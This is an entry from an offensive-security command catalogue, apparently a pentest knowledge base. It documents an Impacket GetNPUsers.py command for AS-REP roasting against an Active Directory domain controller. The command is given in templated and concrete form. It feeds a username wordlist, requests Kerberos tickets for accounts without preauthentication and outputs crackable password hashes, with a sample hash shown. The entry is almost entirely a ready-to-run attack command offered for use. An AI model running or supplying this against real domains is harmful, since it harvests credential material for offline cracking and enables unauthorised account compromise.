---
id: new-for-getnpusers
name: getnpusers-py-brute-force-no-preauth
type: command
executor: bash
data: >-
  GetNPUsers.py $_DOMAIN/ -no-pass -usersfile $_USERS_TXT -dc-ip $_DC_IP
  -request
output: |
  $krb5asrep$23$username@DOMAIN:abcdef123456...
created_at: '2020-03-17T21:43:18.756014+00:00'
updated_at: '2023-05-29T16:48:53.253841+00:00'
platforms:
  - Linux
tags:
  - kerberos
  - roasting
verified: true
validated: true
---

# getnpusers-py-brute-force-no-preauth

## Command

```bash
GetNPUsers.py $_DOMAIN/ -no-pass -usersfile $_USERS_TXT -dc-ip $_DC_IP -request
```

## Description

Requests AS-REP tickets for preauth-disabled users from a wordlist, outputting crackable hashes.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| $_DOMAIN | Domain name | Yes |
| -no-pass | No password needed | Yes |
| -usersfile $_USERS_TXT | Username list file | Yes |
| -dc-ip $_DC_IP | DC IP | Yes |
| -request | Output hashes | Yes |

## Examples

### Basic Usage

```bash
GetNPUsers.py domain.com/ -no-pass -usersfile users.txt -dc-ip 10.10.10.10 -request
```

## Expected Output

$krb5asrep$23$username@DOMAIN:abcdef123456...

## Related

- [[procedures/Brute-Force-AS-REP-Roasting-for-Users-Without-Preauth]]
